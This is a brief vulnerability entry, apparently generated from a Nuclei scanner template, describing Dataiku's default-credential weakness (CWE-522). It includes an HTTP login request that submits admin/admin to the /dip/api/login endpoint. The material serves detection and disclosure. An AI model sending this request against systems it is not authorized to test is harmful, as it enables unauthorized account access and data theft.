# Vulnerability: Dataiku - Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`dataiku-default-login.yaml`)

## Description
Dataiku contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations. This vulnerability may also lead to server-side request forgery and/or remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /dip/api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded;charset=utf-8

login=admin&password=admin
```

